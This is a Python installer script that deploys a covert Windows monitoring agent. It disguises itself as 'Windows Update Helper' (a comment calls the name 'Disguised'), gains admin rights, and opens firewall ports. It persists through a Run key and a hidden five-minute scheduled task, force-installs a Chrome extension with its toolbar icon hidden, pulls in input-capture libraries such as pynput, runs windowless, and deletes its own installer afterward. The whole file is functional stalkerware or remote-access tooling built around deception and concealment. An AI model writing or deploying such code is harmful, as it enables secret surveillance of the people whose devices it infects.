"""
Monitor Agent Deployer
Self-extracting installer that sets up the monitoring agent on Windows devices.
Designed to run silently after initial setup.
"""
import os
import sys
import subprocess
import ctypes
import winreg
import shutil
import socket
import time
import json
import tempfile
import zipfile
import base64
import urllib.request
import threading
from pathlib import Path


# ============== Configuration ==============
APP_NAME = "WindowsUpdateService"  # Disguised name
APP_DISPLAY_NAME = "Windows Update Helper"
INSTALL_DIR = Path(os.environ.get('LOCALAPPDATA', os.path.expanduser('~'))) / 'WindowsUpdate'
CONFIG_FILE = INSTALL_DIR / 'config.json'
LOG_FILE = INSTALL_DIR / 'update.log'
PYTHON_VERSION = "3.11.7"
PYTHON_URL = f"https://www.python.org/ftp/python/{PYTHON_VERSION}/python-{PYTHON_VERSION}-amd64.exe"
REQUIRED_PORTS = [5000, 5001]  # API and WebSocket ports

# Registry keys for persistence
REG_RUN_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
REG_SERVICE_KEY = r"SOFTWARE\WindowsUpdateService"


# ============== Helper Functions ==============

def is_admin():
    """Check if running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin():
    """Restart the script with admin privileges"""
    if sys.argv[0].endswith('.py'):
        script = sys.argv[0]
        params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], ' '.join(sys.argv[1:]), None, 1)
    sys.exit(0)


def log(message, console=True):
    """Log message to file and optionally console"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] {message}"
    
    try:
        INSTALL_DIR.mkdir(parents=True, exist_ok=True)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_line + '\n')
    except:
        pass
    
    if console:
        print(message)


def hide_console():
    """Hide the console window"""
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass


def show_message_box(title, message, style=0):
    """Show Windows message box"""
    ctypes.windll.user32.MessageBoxW(0, message, title, style)


def get_input_dialog(title, message):
    """Get input from user via simple dialog"""
    import tkinter as tk
    from tkinter import simpledialog
    
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    
    result = simpledialog.askstring(title, message, parent=root)
    root.destroy()
    
    return result


# ============== Python Installation ==============

def check_python():
    """Check if Python is installed and return path"""
    try:
        result = subprocess.run(
            ['python', '--version'],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode == 0:
            log(f"Python found: {result.stdout.strip()}")
            return True
    except:
        pass
    
    # Check common installation paths
    possible_paths = [
        Path(os.environ.get('LOCALAPPDATA', '')) / 'Programs' / 'Python' / 'Python311' / 'python.exe',
        Path(os.environ.get('PROGRAMFILES', '')) / 'Python311' / 'python.exe',
        Path('C:/Python311/python.exe'),
    ]
    
    for path in possible_paths:
        if path.exists():
            log(f"Python found at: {path}")
            return True
    
    return False


def install_python():
    """Download and install Python silently"""
    log("Downloading Python...")
    
    installer_path = Path(tempfile.gettempdir()) / 'python_installer.exe'
    
    try:
        urllib.request.urlretrieve(PYTHON_URL, installer_path)
        log("Installing Python silently...")
        
        # Silent install with all users, add to PATH
        result = subprocess.run([
            str(installer_path),
            '/quiet',
            'InstallAllUsers=0',
            'PrependPath=1',
            'Include_test=0',
            'Include_doc=0'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Clean up installer
        try:
            installer_path.unlink()
        except:
            pass
        
        if result.returncode == 0:
            log("Python installed successfully")
            # Refresh environment
            os.environ['PATH'] = subprocess.run(
                ['cmd', '/c', 'echo', '%PATH%'],
                capture_output=True, text=True
            ).stdout.strip() + os.environ.get('PATH', '')
            return True
        else:
            log(f"Python installation failed: {result.stderr}")
            return False
            
    except Exception as e:
        log(f"Failed to install Python: {e}")
        return False


# ============== Firewall Configuration ==============

def configure_firewall():
    """Open required ports in Windows Firewall"""
    log("Configuring firewall...")
    
    for port in REQUIRED_PORTS:
        # Add inbound rule
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name={APP_DISPLAY_NAME} Port {port}',
            'dir=in', 'action=allow', 'protocol=tcp',
            f'localport={port}'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Add outbound rule
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            f'name={APP_DISPLAY_NAME} Port {port} Out',
            'dir=out', 'action=allow', 'protocol=tcp',
            f'localport={port}'
        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    log("Firewall configured")


# ============== Registry Operations ==============

def add_to_registry():
    """Add to registry for startup and recovery"""
    log("Configuring registry for persistence...")
    
    # Add to Run key for auto-start
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_KEY, 0, winreg.KEY_SET_VALUE)
        startup_cmd = f'"{INSTALL_DIR / "monitor_service.pyw"}"'
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, startup_cmd)
        winreg.CloseKey(key)
        log("Added to startup registry")
    except Exception as e:
        log(f"Failed to add to Run key: {e}")
    
    # Create app-specific registry key for config backup
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_SERVICE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "InstallPath", 0, winreg.REG_SZ, str(INSTALL_DIR))
        winreg.CloseKey(key)
    except Exception as e:
        log(f"Failed to create service key: {e}")


def get_config_from_registry():
    """Retrieve configuration from registry"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_SERVICE_KEY, 0, winreg.KEY_READ)
        dashboard_ip, _ = winreg.QueryValueEx(key, "DashboardIP")
        winreg.CloseKey(key)
        return dashboard_ip
    except:
        return None


def save_config_to_registry(dashboard_ip):
    """Save configuration to registry as backup"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_SERVICE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DashboardIP", 0, winreg.REG_SZ, dashboard_ip)
        winreg.CloseKey(key)
    except Exception as e:
        log(f"Failed to save config to registry: {e}")


# ============== Agent Installation ==============

def create_agent_files(dashboard_ip):
    """Create the agent files in the installation directory"""
    log("Creating agent files...")
    
    INSTALL_DIR.mkdir(parents=True, exist_ok=True)
    
    # Save configuration
    config = {
        'dashboard_ip': dashboard_ip,
        'server_url': f'http://{dashboard_ip}:5000',
        'installed_at': time.strftime('%Y-%m-%d %H:%M:%S'),
        'computer_name': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
        'username': os.environ.get('USERNAME', 'unknown')
    }
    
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)
    
    # Also save to registry as backup
    save_config_to_registry(dashboard_ip)
    
    log("Configuration saved")


def install_requirements():
    """Install Python requirements"""
    log("Installing Python dependencies...")
    
    requirements = [
        'psutil==5.9.6',
        'pywin32==306',
        'pynput==1.7.6',
        'watchdog==3.0.0',
        'requests==2.31.0',
        'websocket-client==1.6.4',
        'cryptography==41.0.7',
        'python-dotenv==1.0.0'
    ]
    
    for req in requirements:
        try:
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', req, '-q'],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception as e:
            log(f"Warning: Failed to install {req}: {e}")
    
    log("Dependencies installed")


def copy_agent_source():
    """Copy the agent source code to installation directory"""
    log("Copying agent source...")
    
    # Get the directory where this script is located
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        bundle_dir = Path(sys._MEIPASS)
    else:
        # Running as script
        bundle_dir = Path(__file__).parent.parent
    
    agent_src = bundle_dir / 'agent'
    agent_dst = INSTALL_DIR / 'agent'
    
    if agent_src.exists():
        if agent_dst.exists():
            shutil.rmtree(agent_dst)
        shutil.copytree(agent_src, agent_dst)
        log("Agent source copied")
    else:
        log("Warning: Agent source not found in bundle")


def copy_extension():
    """Copy Chrome extension to installation directory"""
    log("Copying Chrome extension...")
    
    if getattr(sys, 'frozen', False):
        bundle_dir = Path(sys._MEIPASS)
    else:
        bundle_dir = Path(__file__).parent.parent
    
    ext_src = bundle_dir / 'extensions' / 'chromium'
    ext_dst = INSTALL_DIR / 'extension'
    
    if ext_src.exists():
        if ext_dst.exists():
            shutil.rmtree(ext_dst)
        shutil.copytree(ext_src, ext_dst)
        log("Extension copied")
    else:
        log("Warning: Extension source not found")


# ============== Chrome Extension Installation ==============

def get_chrome_user_data_dir():
    """Get Chrome user data directory"""
    return Path(os.environ.get('LOCALAPPDATA', '')) / 'Google' / 'Chrome' / 'User Data'


def install_chrome_extension_via_registry():
    """Install Chrome extension via registry (enterprise deployment)"""
    log("Installing Chrome extension via registry...")
    
    extension_path = INSTALL_DIR / 'extension'
    
    if not extension_path.exists():
        log("Extension not found, skipping Chrome extension installation")
        return False
    
    try:
        # Create the ExtensionInstallForcelist key for Chrome
        chrome_policies_key = r"SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
        
        # Try HKLM first (requires admin), then HKCU
        for hkey in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            try:
                # Create the key if it doesn't exist
                key = winreg.CreateKeyEx(hkey, chrome_policies_key, 0, winreg.KEY_ALL_ACCESS)
                
                # Find the next available index
                index = 1
                while True:
                    try:
                        winreg.QueryValueEx(key, str(index))
                        index += 1
                    except WindowsError:
                        break
                
                # Add the extension (unpacked extension path)
                # Format: extension_id;update_url or just path for unpacked
                extension_value = str(extension_path)
                winreg.SetValueEx(key, str(index), 0, winreg.REG_SZ, extension_value)
                winreg.CloseKey(key)
                
                log(f"Extension registered in registry at index {index}")
                break
            except Exception as e:
                continue
        
        # Also try the ExtensionSettings for more control
        try:
            settings_key = r"SOFTWARE\Policies\Google\Chrome\ExtensionSettings"
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, settings_key, 0, winreg.KEY_ALL_ACCESS)
            
            # Set toolbar_pin to hidden
            settings = {
                "*": {
                    "toolbar_state": "hidden"
                }
            }
            winreg.SetValueEx(key, "*", 0, winreg.REG_SZ, json.dumps(settings))
            winreg.CloseKey(key)
        except:
            pass
        
        return True
        
    except Exception as e:
        log(f"Failed to install extension via registry: {e}")
        return False


def create_chrome_native_messaging_host():
    """Create native messaging host for extension communication"""
    log("Setting up native messaging host...")
    
    native_host_dir = INSTALL_DIR / 'native_host'
    native_host_dir.mkdir(parents=True, exist_ok=True)
    
    # Create the native messaging host manifest
    manifest = {
        "name": "com.monitor.native_host",
        "description": "Monitor Native Host",
        "path": str(native_host_dir / 'native_host.bat'),
        "type": "stdio",
        "allowed_origins": [
            "chrome-extension://*/"
        ]
    }
    
    manifest_path = native_host_dir / 'com.monitor.native_host.json'
    with open(manifest_path, 'w') as f:
        json.dump(manifest, f, indent=2)
    
    # Create batch file that launches the host
    bat_content = f'@echo off\npython "{INSTALL_DIR / "agent" / "src" / "main.py"}" --native-host'
    with open(native_host_dir / 'native_host.bat', 'w') as f:
        f.write(bat_content)
    
    # Register the native messaging host in registry
    try:
        key_path = r"SOFTWARE\Google\Chrome\NativeMessagingHosts\com.monitor.native_host"
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, str(manifest_path))
        winreg.CloseKey(key)
        log("Native messaging host registered")
    except Exception as e:
        log(f"Warning: Failed to register native host: {e}")


# ============== Service Management ==============

def create_service_script():
    """Create the background service script"""
    log("Creating service script...")
    
    service_script = INSTALL_DIR / 'monitor_service.pyw'
    
    script_content = '''#!/usr/bin/env python
"""
Monitor Service - Background Process
Runs silently and restarts if stopped
"""
import os
import sys
import time
import json
import subprocess
import ctypes
import winreg
from pathlib import Path

INSTALL_DIR = Path(r"''' + str(INSTALL_DIR) + '''")
CONFIG_FILE = INSTALL_DIR / 'config.json'
LOG_FILE = INSTALL_DIR / 'service.log'
REG_SERVICE_KEY = r"SOFTWARE\\WindowsUpdateService"

def log(message):
    """Log message"""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {message}\\n")
    except:
        pass

def get_config():
    """Get dashboard configuration"""
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        # Try registry backup
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_SERVICE_KEY, 0, winreg.KEY_READ)
            dashboard_ip, _ = winreg.QueryValueEx(key, "DashboardIP")
            winreg.CloseKey(key)
            return {'server_url': f'http://{dashboard_ip}:5000'}
        except:
            return None

def hide_process():
    """Hide the console window"""
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except:
        pass

def run_agent(server_url):
    """Run the monitoring agent"""
    agent_main = INSTALL_DIR / 'agent' / 'src' / 'main.py'
    
    if not agent_main.exists():
        log(f"Agent not found at {agent_main}")
        return None
    
    # Set environment variables
    env = os.environ.copy()
    env['MONITOR_SERVER_URL'] = server_url
    env['PYTHONPATH'] = str(INSTALL_DIR / 'agent')
    
    # Run agent without console window
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # SW_HIDE
    
    process = subprocess.Popen(
        [sys.executable, '-m', 'src.main', '--server', server_url],
        cwd=str(INSTALL_DIR / 'agent'),
        env=env,
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    return process

def main():
    """Main service loop"""
    hide_process()
    log("Service starting...")
    
    config = get_config()
    if not config:
        log("No configuration found, exiting")
        return
    
    server_url = config.get('server_url', 'http://localhost:5000')
    log(f"Server URL: {server_url}")
    
    process = None
    
    while True:
        try:
            # Start or restart agent if needed
            if process is None or process.poll() is not None:
                if process is not None:
                    log(f"Agent exited with code {process.returncode}, restarting...")
                
                process = run_agent(server_url)
                if process:
                    log(f"Agent started (PID: {process.pid})")
                else:
                    log("Failed to start agent")
                    time.sleep(60)  # Wait before retry
                    continue
            
            # Check every 30 seconds
            time.sleep(30)
            
        except KeyboardInterrupt:
            log("Service interrupted")
            if process:
                process.terminate()
            break
        except Exception as e:
            log(f"Error: {e}")
            time.sleep(60)

if __name__ == '__main__':
    main()
'''
    
    with open(service_script, 'w', encoding='utf-8') as f:
        f.write(script_content)
    
    log("Service script created")


def create_watchdog_task():
    """Create a scheduled task to ensure the service keeps running"""
    log("Creating watchdog scheduled task...")
    
    # Create a VBScript that runs the service silently
    vbs_path = INSTALL_DIR / 'start_service.vbs'
    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw ""{INSTALL_DIR / 'monitor_service.pyw'}"" ", 0, False
'''
    
    with open(vbs_path, 'w') as f:
        f.write(vbs_content)
    
    # Create scheduled task
    task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Helper Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Hidden>true</Hidden>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions>
    <Exec>
      <Command>wscript.exe</Command>
      <Arguments>"{vbs_path}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
    
    task_file = INSTALL_DIR / 'task.xml'
    with open(task_file, 'w', encoding='utf-16') as f:
        f.write(task_xml)
    
    # Register the task
    subprocess.run([
        'schtasks', '/create', '/tn', APP_NAME,
        '/xml', str(task_file), '/f'
    ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    # Delete the temp XML file
    try:
        task_file.unlink()
    except:
        pass
    
    log("Watchdog task created")


def start_service():
    """Start the background service"""
    log("Starting service...")
    
    service_script = INSTALL_DIR / 'monitor_service.pyw'
    
    if not service_script.exists():
        log("Service script not found")
        return False
    
    # Use pythonw (no console) or wscript for VBS
    vbs_path = INSTALL_DIR / 'start_service.vbs'
    
    if vbs_path.exists():
        subprocess.Popen(
            ['wscript.exe', str(vbs_path)],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    else:
        subprocess.Popen(
            ['pythonw', str(service_script)],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    
    log("Service started")
    return True


# ============== Self-Destruction ==============

def self_destruct():
    """Delete the installer executable after setup"""
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        exe_path = sys.executable
        
        # Create a batch file that waits and deletes the exe
        batch_content = f'''@echo off
ping localhost -n 3 > nul
del /f /q "{exe_path}"
del /f /q "%~f0"
'''
        
        batch_path = Path(tempfile.gettempdir()) / 'cleanup.bat'
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        # Run the batch file
        subprocess.Popen(
            ['cmd', '/c', str(batch_path)],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        log("Self-destruct initiated")


# ============== Connection Test ==============

def test_connection(dashboard_ip, port=5000, timeout=5):
    """Test connection to dashboard"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((dashboard_ip, port))
        sock.close()
        return result == 0
    except:
        return False


# ============== Main Installation ==============

def main():
    """Main installation process"""
    print("=" * 50)
    print("  Monitor Agent Deployment")
    print("=" * 50)
    print()
    
    # Check for admin privileges
    if not is_admin():
        print("Requesting administrator privileges...")
        run_as_admin()
        return
    
    log("Installation started")
    
    # Step 1: Check/Install Python
    print("[1/8] Checking Python installation...")
    if not check_python():
        print("      Python not found. Installing...")
        if not install_python():
            show_message_box("Error", "Failed to install Python. Please install Python 3.11+ manually.")
            return
    
    # Step 2: Configure firewall
    print("[2/8] Configuring firewall...")
    configure_firewall()
    
    # Step 3: Get dashboard IP from user
    print("[3/8] Dashboard configuration...")
    
    # Try to get from previous config or registry
    dashboard_ip = get_config_from_registry()
    
    if not dashboard_ip:
        try:
            dashboard_ip = get_input_dialog(
                "Dashboard Configuration",
                "Enter the Dashboard IP address:\n(The device running the monitoring dashboard)"
            )
        except:
            # Fallback to console input
            dashboard_ip = input("Enter the Dashboard IP address: ").strip()
    
    if not dashboard_ip:
        show_message_box("Error", "Dashboard IP is required!")
        return
    
    print(f"      Dashboard IP: {dashboard_ip}")
    
    # Step 4: Test connection
    print("[4/8] Testing connection to dashboard...")
    if test_connection(dashboard_ip):
        print("      ✓ Connection successful")
    else:
        print("      ! Dashboard not reachable (will retry when service starts)")
    
    # Step 5: Create installation directory and copy files
    print("[5/8] Installing agent files...")
    create_agent_files(dashboard_ip)
    copy_agent_source()
    copy_extension()
    
    # Step 6: Install Python dependencies
    print("[6/8] Installing dependencies...")
    install_requirements()
    
    # Step 7: Setup persistence
    print("[7/8] Configuring system integration...")
    create_service_script()
    add_to_registry()
    create_watchdog_task()
    install_chrome_extension_via_registry()
    create_chrome_native_messaging_host()
    
    # Step 8: Start service and cleanup
    print("[8/8] Starting service...")
    start_service()
    
    print()
    print("=" * 50)
    print("  Installation Complete!")
    print("=" * 50)
    print()
    print(f"  Dashboard: {dashboard_ip}")
    print(f"  Install Dir: {INSTALL_DIR}")
    print()
    print("  The agent is now running in the background.")
    print("  This window will close in 5 seconds...")
    print()
    
    log("Installation completed successfully")
    
    # Wait a bit then self-destruct
    time.sleep(5)
    self_destruct()


if __name__ == '__main__':
    main()
